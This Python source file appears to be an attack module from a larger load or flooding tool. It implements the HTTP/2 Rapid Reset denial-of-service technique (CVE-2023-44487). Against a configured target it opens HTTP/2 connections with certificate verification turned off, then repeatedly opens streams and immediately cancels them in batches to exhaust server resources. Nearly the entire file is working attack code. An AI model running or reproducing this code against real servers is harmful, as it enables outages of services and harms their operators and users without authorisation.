"""HTTP/2 rapid reset vector.

Opens a small number of H2 connections, then on each connection opens
streams and immediately resets them (RST_STREAM, CANCEL) in a tight loop —
the asymmetric-cost pattern from CVE-2023-44487 where client cost per stream
is tiny but server cost (stream state + handler scheduling) is large.

Protocol work is done on a raw h2 connection over a raw socket, with an
round-based writer loop: each run_unit emits one batch of
open+reset pairs across all live connections.
"""

from __future__ import annotations

import asyncio

from .base import Vector

try:
    import h2.connection
    import h2.events
    _HAS_H2 = True
except ImportError:
    _HAS_H2 = False


class _H2Conn:
    __slots__ = ("reader", "writer", "h2c", "next_stream", "alive", "authority")

    def __init__(self, reader, writer, authority: str):
        self.reader = reader
        self.writer = writer
        self.authority = authority
        self.h2c = h2.connection.H2Connection()
        self.h2c.initiate_connection()
        self.next_stream = 1
        self.alive = True
        # flush preface + settings
        self.writer.write(self.h2c.data_to_send())
        self._read_frames_nonblocking()

    def _read_frames_nonblocking(self):
        """Consume whatever the server has already sent (SETTINGS, etc.)."""
        try:
            data = self.reader._buffer  # fast path: bytes already buffered
            if data:
                events = self.h2c.receive_data(data)
                out = self.h2c.data_to_send()
                if out:
                    self.writer.write(out)
                self.reader._buffer = b""
        except Exception:
            pass

    def reset_batch(self, n: int) -> int:
        """Open n streams and reset them immediately. Returns frames written."""
        written = 0
        for _ in range(n):
            sid = self.next_stream
            self.next_stream += 2  # client streams are odd
            try:
                self.h2c.send_headers(sid, [
                    (":method", "GET"),
                    (":path", "/"),
                    (":scheme", "https"),
                    (":authority", self.authority),
                ], end_stream=True)
                self.h2c.reset_stream(sid, error_code=0x8)  # CANCEL
                written += 1
            except Exception:
                self.alive = False
                break
        out = self.h2c.data_to_send()
        if out:
            self.writer.write(out)
        return written

    async def close(self):
        self.alive = False
        try:
            self.writer.close()
        except Exception:
            pass


class Http2Reset(Vector):
    name = "http2reset"

    def __init__(self, cfg, stats, worker_id):
        super().__init__(cfg, stats, worker_id)
        if not _HAS_H2:
            raise RuntimeError("http2reset requires the 'h2' package: pip install h2")
        self._conns: list = []
        self._batch = max(1, cfg.http2_streams // max(1, cfg.processes))

    async def _open_one(self) -> _H2Conn:
        tgt = self.cfg.target

        async def _make():
            if tgt.use_tls:
                import ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ctx.set_alpn_protocols(["h2"])
                return await asyncio.open_connection(tgt.host, tgt.port, ssl=ctx)
            return await asyncio.open_connection(tgt.host, tgt.port)

        reader, writer = await self._connect(_make, self.cfg.connect_timeout)
        if tgt.use_tls:
            ssl_obj = writer.get_extra_info("ssl_object")
            proto = ssl_obj.selected_alpn_protocol() if ssl_obj else None
            if proto != "h2":
                writer.close()
                raise RuntimeError(
                    f"server negotiated {proto!r}, not h2 — http2reset "
                    "requires an HTTP/2 endpoint (ALPN)")
        authority = (f"{tgt.host}:{tgt.port}"
                     if tgt.port not in (80, 443) else tgt.host)
        c = _H2Conn(reader, writer, authority)
        self.stats.bump("connections")
        return c

    async def background(self):
        want = max(1, self.cfg.connections // max(1, self.cfg.processes))
        for _ in range(want):
            try:
                self._conns.append(await self._open_one())
            except (asyncio.TimeoutError, ConnectionError, OSError, RuntimeError):
                self.stats.bump("connfail")
                await asyncio.sleep(0.05)

    async def run_unit(self, t: float):
        if not self._conns:
            try:
                self._conns.append(await self._open_one())
            except (asyncio.TimeoutError, ConnectionError, OSError, RuntimeError):
                self.stats.bump("connfail")
                return
        total = 0
        for c in self._conns:
            total += c.reset_batch(self._batch)
        self.stats.bump("streams_reset", total)
        self.stats.bump("requests", total)
        self.stats.bump("success", total)
        if any(not c.alive for c in self._conns):
            self._conns = [c for c in self._conns if c.alive]

    async def aclose(self):
        for c in self._conns:
            await c.close()
        self._conns.clear()
